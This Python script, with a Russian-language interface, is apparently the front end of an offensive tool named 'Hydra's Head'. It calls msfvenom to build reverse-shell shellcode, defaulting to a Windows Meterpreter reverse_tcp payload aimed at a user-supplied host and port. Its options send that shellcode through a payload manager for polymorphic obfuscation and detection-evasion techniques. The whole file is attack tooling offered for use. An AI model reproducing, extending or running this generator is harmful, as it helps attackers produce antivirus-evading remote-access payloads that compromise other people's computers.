import os
import sys
import subprocess
import tempfile
import argparse

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from core.manager import PayloadManager
from core.config import load_config

def banner():
    print("""
    ╦ ╦╦ ╦╔╦╗╦═╗╔═╗╔═╗  ╦ ╦╔═╗╔═╗╔╦╗ - SHELLCODE MAKER
    ╠═╣╚╦╝ ║║╠╦╝╠═╣╚═╗  ╠═╣║╣ ╠═╣ ║║
    ╩ ╩ ╩ ═╩╝╩╚═╩ ╩╚═╝  ╩ ╩╚═╝╩ ╩═╩╝
    Скрипт для генерации полиморфного шелл-кода
    """)

def generate_shellcode(payload_type, host, port, format_type="raw"):
    print(f"[+] Генерация шелл-кода {payload_type} для {host}:{port}...")

    try:
        subprocess.run(["msfvenom", "--help"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print("[-] Ошибка: msfvenom не найден. Установите Metasploit Framework.")
        return None

    output_file = tempfile.mktemp()

    cmd = [
        "msfvenom",
        "-p", payload_type,
        f"LHOST={host}",
        f"LPORT={port}",
        "-f", format_type,
        "-o", output_file
    ]

    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if result.returncode != 0:
            print(f"[-] Ошибка при создании шелл-кода: {result.stderr}")
            return None

        print(f"[+] Шелл-код успешно создан: {output_file}")
        return output_file

    except Exception as e:
        print(f"[-] Произошла ошибка: {str(e)}")
        return None

def parse_arguments():
    parser = argparse.ArgumentParser(description="Hydra's Head Shellcode Generator")

    parser.add_argument("--payload", "-p", default="windows/meterpreter/reverse_tcp",
                      help="Тип полезной нагрузки msfvenom (по умолчанию: windows/meterpreter/reverse_tcp)")
    parser.add_argument("--host", required=True, help="IP-адрес для обратного соединения (LHOST)")
    parser.add_argument("--port", type=int, required=True, help="Порт для обратного соединения (LPORT)")
    parser.add_argument("--output", "-o", required=True, help="Имя выходного файла")
    parser.add_argument("--format", "-f", default="raw", choices=["raw", "hex", "csharp", "python", "ruby", "js_be"],
                      help="Формат вывода шелл-кода (по умолчанию: raw)")
    parser.add_argument("--obfuscate", action="store_true", help="Применить обфускацию к шелл-коду")
    parser.add_argument("--level", default="medium", choices=["low", "medium", "high", "max"],
                      help="Уровень обфускации (по умолчанию: medium)")
    parser.add_argument("--iterations", "-i", type=int, default=1, help="Количество итераций полиморфизма")
    parser.add_argument("--evasion", "-e", action="store_true", help="Добавить техники обхода обнаружения")

    return parser.parse_args()

def main():
    banner()
    args = parse_arguments()

    shellcode_file = generate_shellcode(args.payload, args.host, args.port, args.format)
    
    if not shellcode_file:
        return 1

    try:
        with open(shellcode_file, "rb") as f:
            shellcode_data = f.read()
        
        print(f"[+] Размер исходного шелл-кода: {len(shellcode_data)} байт")

        if args.obfuscate:
            print(f"[+] Применение обфускации уровня {args.level}...")
            
            config = load_config()
            manager = PayloadManager(config)
            
            result_file = manager.generate(
                payload_type="shellcode",
                payload=shellcode_file,
                output_path=args.output,
                obfuscation_level=args.level,
                use_evasion=args.evasion,
                iterations=args.iterations
            )
            
            print(f"[+] Обфусцированный шелл-код сохранен в: {result_file}")
        else:
            import shutil
            shutil.copy(shellcode_file, args.output)
            print(f"[+] Шелл-код сохранен без изменений в: {args.output}")
            
        os.unlink(shellcode_file)
        
        return 0
    
    except Exception as e:
        print(f"[-] Ошибка при обработке шелл-кода: {str(e)}")
        return 1

if __name__ == "__main__":
    sys.exit(main())